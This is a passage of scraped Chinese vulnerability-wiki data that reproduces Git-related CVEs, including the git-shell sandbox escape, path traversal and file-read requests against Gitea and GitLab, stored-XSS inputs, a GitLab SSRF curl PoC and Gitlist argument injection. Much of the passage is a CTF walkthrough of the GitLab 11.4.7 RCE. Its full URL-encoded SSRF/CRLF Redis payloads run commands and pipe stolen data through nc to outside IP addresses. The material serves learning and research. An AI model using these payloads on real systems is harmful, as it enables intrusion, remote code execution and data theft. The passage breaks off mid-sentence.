远程命令执行漏洞 CVE-2020-27955","keywords":"","body":"Git-LFS 远程命令执行漏洞 CVE-2020-27955 漏洞描述 Git LFS 是 Github 开发的一个 Git 的扩展，用于实现 Git 对大文件的支持 一些受影响的产品包括Git，GitHub CLI，GitHub Desktop，Visual Studio，GitKraden，SmartGit，Sourcetree等 该漏洞影响仅windows平台 漏洞影响 [!NOTE] Git-LFS（git-lfs） 漏洞复现 运行下列的命令，如果版本在影响范围则会弹出计算器 git clone https://github.com/r00t4dm/CVE-2020-27955 漏洞POC https://github.com/r00t4dm/CVE-2020-27955 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:18 "},"Web安全/GIT-SHELL/（CVE-2017-8386）GIT-SHELL 沙盒绕过/（CVE-2017-8386）GIT-SHELL 沙盒绕过.html":{"url":"Web安全/GIT-SHELL/（CVE-2017-8386）GIT-SHELL 沙盒绕过/（CVE-2017-8386）GIT-SHELL 沙盒绕过.html","title":"（CVE-2017-8386）GIT-SHELL 沙盒绕过","keywords":"","body":"（CVE-2017-8386）GIT-SHELL 沙盒绕过 一、漏洞简介 二、漏洞影响 Git 2.4.12之前的版本，2.5.6之前的2.5.x版本，2.6.7之前的2.6.x版本，2.7.5之前的2.7.x版本，2.8.5之前的2.8.x版本，2.9.4之前的2.9.x版本，2.10.3之前的2.10.x版本，2.11.2之前的2.11.x版本，2.12.3之前的2.12.x版本。 三、复现过程 漏洞分析 git-shell是git服务中重要的组成部分，众所周知，git服务支持ssh、git、https三种协议来传递项目，其中ssh是最安全，也最方便的一种方式。 我们随便打开Github上一个项目，找到Clone with SSH里列出的地址：:phith0n/vulhub.git，其实这个url就是告诉git，ssh用户名是git，地址是github.com（默认端口是22），该项目位于phith0n/vulhub.git这个目录下；然后git就通过ssh协议连接上github.com，并将对应目录下的项目拉取下来。 所以，基于ssh协议的git clone等操作，本质上就是通过ssh协议连接上git服务器，并将指定目录拉取下来的过程。 那么，既然这个过程是个ssh交互的过程，那么我直接执行ssh git@github.com是不是就可以登录github服务器了呢？显然是不行的，你可以试试：GIT-SHELL沙盒绕过/media/rId25.png)说\"不行\"其实也有偏差，实际上我确实是连接上了其ssh服务，并验证身份通过了，但他给了我一段提示信息\"Hi phith0n! You\\'ve successfully authenticated, but GitHub does not provide shell access.\"，就把我的连接关了。 所以，正常来说，基于ssh的git拉取过程对于git服务器是安全的。 如何禁止git用户执行系统shell 那么，github这类git服务商是怎么实现上述\"安全\"通信的流程的呢？ 让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现： 创建系统用户git的时候将其shell设置成git-shell 在authorized_keys文件每个ssh-key的前面设置command，覆盖或劫持重写原本的命令 第一种方法比较直观，就是创建用户的时候不给其正常的bash或sh的shell，而是给它一个git-shell。git-shell是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。 第二种方法不仅在git服务器上使用，很多Linux发行版也会用到。比如aws，默认安装后是不允许root登录的，实现方法就是在/root/.ssh/authorized_keys中设置command=\"echo 'Please login as the user \\\"ec2-user\\\" rather than the user \\\"root\\\".';echo;sleep 10\"。这句话相当于覆盖了原本执行的shell，变成了echo一段文字。 当然，第二种方法内也可以用git-shell，比如在添加git用户的时候赋予其正常的/bin/bash，但在authorized_keys中设置command=\"git-shell -c \\\"$SSH_ORIGINAL_COMMAND\\\"\"，实际上还是使用了git-shell。 git-shell 沙盒绕过漏洞（CVE-2017-8386） git-shell是一个可以限制用户执行命令的shell，如果我们在git用户家目录下创建一个新目录，叫git-shell-commands，然后将你允许用户执行的命令放在这个目录下，这就创建好了一个沙盒。在git-shell中，只能执行/home/git/git-shell-commands目录下的命令。 如果系统是没有git-shell-commands目录，那么git-shell默认只允许执行如下三个命令： git-receive-pack git-upload-pack git-upload-archive 这就是白名单。 但CVE-2017-8386的作者发现，执行git-upload-archive --help（或git-receive-pack --help），将会进入一个交互式的man页面，man又调用了less命令，最后是一个可以上下翻页的帮助文档。 本来这也没什么，但是，less命令有一个特性，就是其支持一些交互式的方法。比如在less页面中，按shift+e可以打开Examine功能，通过这个功能可以读取任意文件；输入!id就可以执行id这个命令。 可以随便找台linux计算机试一下，执行less /etc/passwd来到less的页面，然后在英文输入法下输入!id，就可以执行id命令：GIT-SHELL沙盒绕过/media/rId28.png)所以，利用这个特性，我们就可以绕过git-shell的沙盒读取任意文件，或执行任意命令了！ 我们可以先试试，在Linux下直接执行git-receive-pack --help，再输入!id，看到的效果和上图是类似的。 通过ssh进行利用 那么，如何远程利用这个漏洞？ 我们前面试了，直接ssh git@gitserver只能拿到git-shell（或返回一段提醒文字），我们就利用上一节里提到的沙盒绕过漏洞执行命令： ssh -p 3322 -i id_rsa -t git@127.0.0.1 \"git-upload-archive '--help'\" 进入帮助页面，然后按shift+e或!id即可。 一些限制 我前文说了，一般配置git用户，不让ssh拥有shell，有两种方法：一是创建用户的时候设置其shell为/usr/bin/git-shell，二是在authorized_keys中覆盖command。 如果目标服务器使用了第一种方法，我们即使成功执行了git-upload-archive '--help'进入帮助页面，也不能执行命令。因为!id还是在git-shell下执行，git-shell中没有id命令，所以依旧执行不成功。 但读取文件是一定可以的，因为读取文件不是通过命令读取的，所以不受git-shell沙盒的影响。 如果目标服务器是用第二种方法配置的git-shell，比如我这里这个测试环境，我是在/etc/passwd文件设置git用户的shell是bash，而在authorized_keys中覆盖command，执行git-shell。 这种情况下，如果我进入了帮助页面，输入!id是可以成功执行id命令的，因为此时id是在bash下执行的，而不是在git-shell下执行的，所以没有沙盒限制。 总的来说，这个漏洞至少能做到任意文件读取，有可能可以执行任意命令。 漏洞复现 测试环境 编译及运行测试环境： docker-compose build docker-compose up -d 为了不和docker母机的ssh端口冲突，我将容器的ssh端口设置成3322。本目录下我生成了一个id_rsa，这是ssh的私钥，连接的时候请指定之。 在连接以前，需要先设置私钥的权限为0600：chmod 0600 id_rsa，否则连接可能失败。 正常连接其ssh服务ssh -p 3322 -i id_rsa git@127.0.0.1，会被git-shell给拦截，返回错误fatal: unrecognized command ''，并且连接被关闭。 使用--help技巧，连接目标并进入帮助页面： ssh -p 3322 -i id_rsa -t git@127.0.0.1 \"git-upload-archive '--help'\" 按shift+e，读取任意文件：GIT-SHELL沙盒绕过/media/rId33.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:19 "},"Web安全/Gitbook/（CVE-2017-15688）Gitbook 任意文件读取/（CVE-2017-15688）Gitbook 任意文件读取.html":{"url":"Web安全/Gitbook/（CVE-2017-15688）Gitbook 任意文件读取/（CVE-2017-15688）Gitbook 任意文件读取.html","title":"（CVE-2017-15688）Gitbook 任意文件读取","keywords":"","body":"（CVE-2017-15688）Gitbook 任意文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 创建一个md文件，代码用以下 ln -s /etc/passwd ./passwd.md Gitbook任意文件读取/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:20 "},"Web安全/Gitbook/（CVE-2019-19596）Gitbook 储存型xss/（CVE-2019-19596）Gitbook 储存型xss.html":{"url":"Web安全/Gitbook/（CVE-2019-19596）Gitbook 储存型xss/（CVE-2019-19596）Gitbook 储存型xss.html","title":"（CVE-2019-19596）Gitbook 储存型xss","keywords":"","body":"（CVE-2019-19596）Gitbook 储存型xss 一、漏洞简介 GitBook through 2.6.9 allows XSS via a local .md file By entering script in MD file, it can be executed by gitbook 二、漏洞影响 GitBook 2.6.9 三、复现过程 Gitbook储存型xss/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:21 "},"Web安全/Gitea/Gitea 1.4.0 目录穿越导致命令执行漏洞/Gitea 1.4.0 目录穿越导致命令执行漏洞.html":{"url":"Web安全/Gitea/Gitea 1.4.0 目录穿越导致命令执行漏洞/Gitea 1.4.0 目录穿越导致命令执行漏洞.html","title":"Gitea 1.4.0 目录穿越导致命令执行漏洞","keywords":"","body":"Gitea 1.4.0 目录穿越导致命令执行漏洞 一、漏洞简介 二、漏洞影响 Gitea 1.4.0 三、复现过程 执行如下命令启动启动漏洞环境： docker-compose up -d 环境启动后，访问http://www.0-sec.org:3000，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号） 安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：1.png 然后，需要执行一次docker-compose restart重启gitea服务。 由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。 打开gitea，找到刚才创建的公开项目，如vulhub/repo，发送如下数据包，添加一个Git LFS对象： POST /vulhub/repo.git/info/lfs/objects HTTP/1.1 Host: www.0-sec.org:3000 Accept-Encoding: gzip, deflate Accept: application/vnd.git-lfs+json Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 151 { \"Oid\": \"....../../../etc/passwd\", \"Size\": 1000000, \"User\" : \"a\", \"Password\" : \"a\", \"Repo\" : \"a\", \"Authorization\" : \"a\" } 然后，访问http://www.0-sec.org:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth，即可看到/etc/passwd已被成功读取：2.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:22 "},"Web安全/Gitlab/（CVE-2016-9086）Gitlab 任意文件读取漏洞/（CVE-2016-9086）Gitlab 任意文件读取漏洞.html":{"url":"Web安全/Gitlab/（CVE-2016-9086）Gitlab 任意文件读取漏洞/（CVE-2016-9086）Gitlab 任意文件读取漏洞.html","title":"（CVE-2016-9086）Gitlab 任意文件读取漏洞","keywords":"","body":"（CVE-2016-9086）Gitlab 任意文件读取漏洞 一、漏洞简介 二、漏洞影响 GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13 三、复现过程 编译及运行环境： docker-compose build docker-compose up -d 请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行Gitlab（运行后502错误）。 环境运行后，Web端口为10080，ssh端口为10022。访问http://www.0-sec.org:10080，设置管理员（用户名root）密码，登录。 新建一个项目，点击GitLab export：1.png将test.tar.gz上传，将会读取到/etc/passwd文件内容：2.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:26 "},"Web安全/Gitlab/Gitlab wiki 储存型xss/Gitlab wiki 储存型xss.html":{"url":"Web安全/Gitlab/Gitlab wiki 储存型xss/Gitlab wiki 储存型xss.html","title":"Gitlab wiki 储存型xss","keywords":"","body":"Gitlab wiki 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 1、登录到GitLab。 2、打开有权编辑Wiki页面的'Project'。 3、打开Wiki页面。 4、点击'New page'。 5、用'javascript:'填写'Page slug'表单。 6、点击'Createpage'。 7、填写每个表格： Title: javascript: Format:Markdown Content: [XSS](.alert(1);) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:24 "},"Web安全/Gitlab/Gitlab 任意文件读取漏洞/Gitlab 任意文件读取漏洞.html":{"url":"Web安全/Gitlab/Gitlab 任意文件读取漏洞/Gitlab 任意文件读取漏洞.html","title":"Gitlab 任意文件读取漏洞","keywords":"","body":"Gitlab 任意文件读取漏洞 一、漏洞简介 在UploadsRewriter不验证文件名，允许任意文件，以通过目录遍历移动的问题，以新项目时被复制。 用于查找参考的模式是： MARKDOWN_PATTERN = %r{\\!?\\[.*?\\]\\(/uploads/(?[0-9a-f]{32})/(?.*?)\\)}.freeze 这是使用的UploadsRewriter复制问题也跨文件复制时： @text.gsub(@pattern) do |markdown| file = find_file(@source_project, $~[:secret], $~[:file]) break markdown unless file.try(:exists?) klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader moved = klass.copy_to(file, target_parent) ... def find_file(project, secret, file) uploader = FileUploader.new(project, secret: secret) uploader.retrieve_from_store!(file) uploader end 由于没有限制file，因此可以使用路径遍历来复制任何文件。 二、漏洞影响 三、复现过程 创建两个项目 1.png 添加具有以下描述的问题： ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) 将问题移至第二个项目 2.png 该文件将被复制到项目中 3.png 4.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:25 "},"Web安全/Gitlab/gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析/gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析.html":{"url":"Web安全/Gitlab/gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析/gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析.html","title":"gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析","keywords":"","body":"gitlab-11.4.7远程代码执行漏洞及exp史诗级详细剖析 TL;DR git://协议中的CLRF注入将RCE中的IPv6/IPv4地址嵌入链。 youtube vedio by liveoverflow GitLab 11.4.7 Remote Code Execution-Real World CTF 2018 说明 在real world CTF上，一个叫做flaglab的有趣的web挑战。描述说: \"You might need a 0day\" 有一个挑战的链接，还有一个docker-compose.yml文件的下载链接。在访问挑战站点时，GitLab表示欢迎。docker-compose.yml文件可以用来设置这个实例的本地版本。在docker-compose.yml,docker映像被设置为gitlab/gitlab-ce:11.4.7-ce.0。在对gitlab版本做谷歌搜索时，偶然发现了一篇关于gitlab补丁发布的博客文章，它似乎是最新的版本——该博客文章创建于2018年11月21日，CTF是在2018年12月1日举行。因为GitLab有庞大的代码库，所以认为根本不可能在它身上找到一天的时间，这只是在浪费时间…… 但事实证明，在这些假设上是错误的。一些来自RPISEC的人说，它不是最新版本–有一个新版本11.4.8，并且新版本的提交历史显示了几个安全补丁。其中一个漏洞是“Webhooks中的SSRF”，这是Chaitin Tech的nyangawa报告的(Chaitin Tech也是组织real world CTF的公司)。 设置 现在开始设置GitLab漏洞版本的本地副本。可以从docker-compose.yml文件开始。 web: image: 'gitlab/gitlab-ce:11.4.7-ce.0' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://gitlab.example.com' redis['bind']='127.0.0.1' redis['port']=6379 gitlab_rails['initial_root_password']=File.read('/steg0_initial_root_password') ports: - '5080:80' - '50443:443' - '5022:22' volumes: - './srv/gitlab/config:/etc/gitlab' - './srv/gitlab/logs:/var/log/gitlab' - './srv/gitlab/data:/var/opt/gitlab' - './steg0_initial_root_password:/steg0_initial_root_password' - './flag:/flag:ro' 从上面的YAML文件中，可以得出以下结论: 使用的docker映像是GitLab Community Edition 11.4.7 GitLab -ce:11.4.7-ce.0 Redis服务器运行在6379端口，它正在监听本地主机 使用一个名为steg0_initial_root_password的文件设置rails initial_root_password 有一些端口从docker容器映射到我们的机器，这将应用程序暴露在容器外供我们操作。我们将使用运行在端口5080上的HTTP服务。 此外，还有卷，它挂载docker容器内的本地文件和文件夹。例如，机器上的./srv/gitlab/logs将被挂载到docker容器内的/var/log/gitlab。密码文件和flag也被复制到容器中 使用以下命令创建这些所需的文件和文件夹: # Create required folders for the gitlab logs, data and configs. leave it empty mkdir -p ./srv/gitlab/config ./srv/gitlab/data ./srv/gitlab/logs # Create a random password using python python3 -c \"import secrets; print(secrets.token_urlsafe(16))\" > ./steg0_initial_root_password # ==OR== # Choose your own password echo \"my_sup3r_s3cr3t_p455w0rd_4ef5a2e1\" > ./steg0_initial_root_password # Create a test flag echo \"RWCTF{this_is_flaglab_flag}\" > ./flag 现在有了所需的文件和文件夹，可以使用以下命令启动docker容器。 $ docker-compose up 下载基本映像并构建gitlab实例的过程可能需要几分钟。在您开始查看一些日志之后，应该能够浏览到 http://127.0.0.1:5080/ 以获得易受攻击的GitLab版本。 现在是时候配置chrome浏览器来使用代理服务器了。你可以在设置中手动修改，也可以通过命令行操作，这样更方便。 /path/to/chrome --proxy-server=\"127.0.0.1:8080\" --profile-directory=Proxy --proxy-bypass-list=\"\" 遇到过Burp套件代理无法拦截本地主机请求的问题，即使旁路列表是空的。因此，一个快速的解决方法是在hosts文件中添加一个条目，如下所示。 127.0.0.1 localhost.com 现在浏览 http://localhost.com:5080 通过Burp套件代理访问GitLab。这就是所有的设置! bugs 正如已经知道的，当时认为11.4.7是GitLab的最新版本，但实际上，有一个更新的版本11.4.8，在提交中有许多安全补丁。其中一个漏洞与SSRF有关，它甚至提到了Chaitin Tech，该公司负责托管real world CTF。此外，还知道flag文件位于/(文件系统的/root)，因此需要一个任意文件读取或远程代码执行漏洞。现在来看看针对SSRF和其他潜在bug的那些补丁。在顶部，将发现3个与安全相关的提交。 在Webhooks中有SSRF，也有XSS，但它不是那么有趣，最后，在有CRLF注入(Carriage-Return/Line-Feed) ，它基本上是换行注入。如果查看SSRF问题的修复并向下滚动一点，将看到有一些单元测试可以确认该问题的修复。这些测试告诉如何利用漏洞，这正是想要的。看看一些测试用例，显然，嵌入IPv4地址的特殊IPv6地址可以绕过SSRF检查。 # SSRF protection Bypass https://[0:0:0:0:0:ffff:127.0.0.1] 另一个问题是项目钩子中的CRLF漏洞，向下滚动到测试用例，可以看到它只是带换行的url。要么是URL编码的，要么就是普通的换行符。现在的问题是，这些漏洞能帮助利用GitLab来获得flag吗?通过链接这两个bug，可以得到一个远程代码执行。这实际上是一个典型的安全问题。基本上，SSRF或服务器端请求伪造用于针对本地内部Redis数据库，该数据库广泛用于不同类型的工作者。因此，如果可以推出一个恶意的worker，可能会以一个远程代码执行漏洞而告终。事实上，GitLab之前已经被这样利用过好几次了，有很多类似的bug bounty文章。不记得第一次使用这种技术是在哪里，但记得是@Agarri_FR在2015年发的推特上说的，2014年他也有一篇博文-Trying to hack Redis via HTTP requests。确实遇到了很多关于bug的赏金文章，所以每个对网络安全感兴趣的人都应该知道这个。 漏洞利用 现在看看有趣的东西，首先，看看是否能在某处触发SSRF。首先，考虑将webhook(用于在储存库中触发任何事件时, 向URL发送请求)作为目标，就像这里提到的那样。然而，当点击创建一个新项目时，看到了多种导入项目的方法，其中一种是通过URL repo，它基本上会在你指定URL时获取repo。可以在http://，上导入repo https:// 和 git://。因此，为了测试这一点，可以尝试使用以下URL导入repo。 但是得到的错误是“Import URL is blocked: Requests to localhost are not allowed”。 现在，可以尝试使用特殊的IPv6地址绕过。如果把导入URL替换成下面的。 http://[0:0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf.git 在使用这个URL导入之前，需要一个服务器监听端口1234以确认SSRF。为此，可以在docker容器上获得一个root shell来安装netcat，然后监听端口1234以查看是否触发了SSRF。首先，继续并列出所有正在运行的Docker容器，以了解应该在哪个容器上安装shell。 # get a list of running docker containers $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS NAMES bd9daf8c07a6 gitlab/gitlab-ce:11.4.7-ce.0 ... ... ... ... 现在只有一个在运行，是GitLab 11.4.7。通过指定容器ID，可以使用以下命令获得容器上的shell。 $ docker exec -i -t bd9daf8c07a6 \"/bin/bash\" 这里 bd9daf8c07a6是容器ID -i 的意思是与/bin/bash的交互 -t 表示创建tty -a 用于交互的伪终端 现在已经有了shell，可以安装netcat，这样就可以设置一个简单的服务器来侦听传入的SSRF请求。 root@gitlab:~ apt update && apt install -y netcat 设置原始TCP服务器非常简单，如下命令所示。 root@gitlab:~ nc -lvp 1234 这里 -l 是要告诉netcat必须“听” -v 是详细输出 -p 指定服务器必须绑定的端口号 现在已经完成了SSRF测试设置，然后发出相同的导入请求，看看是否可以触发SSRF。此外，与在浏览器中指定web应用程序的URL不同，可以使用Burp套件的中继器根据需要快速修改HTTP请求并将其发送出去。要做到这一点，可以修改旧的“通过URL repo”请求。可以将URL更新为： http://[0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf git和项目的名称转换到还不存在的地方，然后发送请求。 可以看到上面的图片,请求被困在netcat listener,这证实有SSRF可以跟内部服务,在的案例中是当地netcat服务器在端口1234上,这意味着可以谈谈内部复述,服务器在端口6379上运行(docker-compose.yml中指定)。 但是什么是Redis以及GitLab如何使用它? Redis是一个内存数据结构存储，用作数据库，缓存和消息代理。GitLab以不同的方式使用它，比如存储会话数据、缓存甚至后台作业队列。Redis使用了一种简单明了的纯文本协议，这意味着可以直接使用netcat连接到Redis并开始使用它。 # quick test with redis root@gitlab:~ nc 127.0.0.1 6379 blah - ERR unknown command 'blah' set liveoverflow test +OK asd - ERR unknown command 'asd' get liveoverflow $4 test Redis是一个简单的基于ASCII文本的协议，但HTTP也是一个简单的基于ASCII文本的协议。现在，如果尝试向Redis发送HTTP请求会发生什么?Redis会执行命令吗?现在试一试。 # http request test with redis root@gitlab:~ nc 127.0.0.1 6379 GET /test/ssrf.git/info/refs?service=git-upload-pack HTTP/1.1 Host: [0:0:0:0:0:ffff:127.0.0.1]:1234 User-Agent: git/2.18.1 Accept: */* Accept-Encoding: deflate, gzip Pragma: no-cache - Err wrong number of arguments for 'get' command root@gitlab:~ 出现了一个错误，说’get’命令的一些参数是错误的，这是有意义的，因为从前面的例子中，知道’get’命令如何在Redis中工作。但是，后来又退回了shell里，然而从早些时候开始，看到即使有错误Redis也不会退出，那么到底发生了什么呢?将原始HTTP协议数据逐行粘贴可以得到答案。第二行 Host: [0:0:0:0:0:ffff:127.0.0.1]:1234 负责Redis意外终止连接。这是因为SSRF到Redis是一个巨大的问题，Redis已经实现了一个fix。如果字符串”Host:”以命令形式呈现给Redis服务器，它就会知道这是一个试图私下执行Redis命令的HTTP请求，并通过关闭连接来停止执行。 只有当能够在第一行(get /test…)和第二行(Host:…)之间获得payload时，才能使其工作。既然控制了HTTP请求的第一行，可以注入一些新行并添加更多命令吗? *cough* CRLF *cough* 在安全发布和提交历史中看到的CRLF注入错误，可以使用它! 从提交历史的测试用例中，可以看到注入是非常直接的。例如，仅仅通过添加新行或URL编码就可以实现这一目的。 http://127.0.0.1:333/%0D%0Atest%0D%0Ablah.git # Expected to be Converted To http://127.0.0.1:333/ test blah.git 然而并没有成功。不确定为什么这不能工作，但是通过将协议从http:// 更改为git:// 可以使其工作。 # Does work :) git://127.0.0.1:333/%0D%0Atest%0D%0Ablah.git # Expected to be Converted To git://127.0.0.1:333/ test blah.git 现在已经知道了Redis是什么，它在哪里被使用，以及如何使用CRLF注入添加新行，接下来可以为RCE创建payload。这个想法是通过使用SSRF漏洞与内部Redis服务器通信，并将一个协议(Redis)私接到另一个协议(git://)中，并获得远程代码执行。 幸运的是，@jobertabma已经测试出了payload - Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook。现在看看。 multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec 如你所知，Redis还可以用于后台工作队列。这些工作由Sidekiq处理，它是ruby的后台任务处理器。可以查看sidekiq队列的列表，看看是否有可以使用的东西。 ... - [default, 1] - [pages, 1] - [system_hook_push, 1] - [propagate_service_template, 1] - [background_migration, 1] ... system_hook_push可以用来处理新作业它和实际payload中使用的是一样的。现在，为了执行代码/命令，现在需要一个类来做这件事，把它看作一个小工具。幸运的是，Jobert还找到了正确的类–gitlab_shell_worker.rb。 class GitlabShellWorker include ApplicationWorker include Gitlab::ShellAdapter def perform(action, *arg) gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend end end 正如所看到的，这正是一直在寻找的类。现在这个GitlabShellWorker被调用时带有一些参数，比如class_eval和需要执行的真正的命令，在例子中，如下所示。 open('| COMMAND_TO_BE_EXECUTED').read 在实际payload中，将队列推送到system_hook_push并让GitlabShellWorker类运行命令。 现在有了探索所需的一切，可以制作出最后的payload并执行。在此之前，需要在主计算机(192.168.178.21)上设置一个netcat listener来接收该flag。 $ nc -lvp 1234 最终的payload如下所示。 multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| cat /flag | nc 192.168.178.21 1234\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec 有一些重点需要注意: 在上面的payload中，redis命令的每一行前面都需要有一个空格–不知道为什么 正在读取flag并将其发送给我们的netcat listener 添加一个额外的exec命令，以便第一个命令正确执行，第二个命令将与下一行而不是第一行连接。这样做是为了payload的重要部分不会破裂 带有payload的最终import URL: 没有url编码之前的payload(可根据自己需要修改) # 没有url编码之前的payload git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|cat /flag | nc 192.168.178.21 1234\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf.git url编码之后的payload # url编码之后的payload git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20192%2E168%2E178%2E21%201234%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git 现在，如果发送“Repo by URL”请求与此URL，将得到flag! 结论和收获 挖洞要细心 多跟踪大牛的twitter保存经验和payload 参考 https://fdlucifer.github.io/2020/12/17/gitlab-remote-code-execution/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:22 "},"Web安全/Gitlab/GitLab前台SSRF漏洞/GitLab前台SSRF漏洞.html":{"url":"Web安全/Gitlab/GitLab前台SSRF漏洞/GitLab前台SSRF漏洞.html","title":"GitLab前台SSRF漏洞","keywords":"","body":"GitLab前台SSRF漏洞 漏洞描述 GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的Web服务。GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。 漏洞影响 GitLab CE/EE >=10.5 漏洞复现 1、环境搭建 以CentOS为例，先添加gitlab更新源。 [gitlab-ce]name=Gitlab CE Repositorybaseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el$releasever/gpgcheck=0enabled=1 添加更新源后使用命令yum makecache缓存更新源数据。 使用如下命令可以得到当前更新源中可安装所有的gitlab版本 yum list gitlab-ce --showduplicates|sort -r 使用yum安装指定版本，例如13.12.1 yum install gitlab-ce-13.12.1-ce.0.el7 使用命令gitlab-ctl reconfigure即可默认配置安装gitlab。 2、漏洞复现 直接运行poc，remote后面即为ssrf访问的地址。 curl -s --show-error -H 'Content-Type: application/json' https://example.gitlab.com/api/v4/ci/lint --data '{ \"include_merged_yaml\": true, \"content\": \"include:\\n remote: http://x.x.x.x:port/api/v1/targets?test.yml\"}' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:25 "},"Web安全/Gitlist/Gitlist 0.6.0 远程命令执行漏洞/Gitlist 0.6.0 远程命令执行漏洞.html":{"url":"Web安全/Gitlist/Gitlist 0.6.0 远程命令执行漏洞/Gitlist 0.6.0 远程命令执行漏洞.html","title":"Gitlist 0.6.0 远程命令执行漏洞","keywords":"","body":"Gitlist 0.6.0 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 Gitlist 0.6.0 三、复现过程 环境搭建 执行如下命令启动漏洞环境： docker-compose up -d 环境启动后，访问http://your-ip:8080将看到一个名为example的仓库。 漏洞分析 在用户对仓库中代码进行搜索的时候，gitlist将调用git grep命令： public function searchTree($query, $branch) { if (empty($query)) { return null; } $query = escapeshellarg($query); try { $results = $this->getClient()->run($this, \"grep -i --line-number {$query} $branch\"); } catch (\\RuntimeException $e) { return false; } 其中，$query是搜索的关键字，$branch是搜索的分支。 如果用户输入的$query的值是--open-files-in-pager=id;，将可以执行id命令：1.png导致这个漏洞的原因，有几点： 开发者对于escapeshellarg函数的误解，造成参数注入 git grep的参数--open-files-in-pager的值，将被直接执行 理论上，在经过$query = escapeshellarg($query);处理后，$query将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在\"参数值\"的位置，而不是出现在参数选项（option）中。 我们可以试一下如下命令： git grep -i --line-number -e '--open-files-in-pager=id;' master 2.png如上图，我将$query放在了-e参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数--open-files-in-pager。 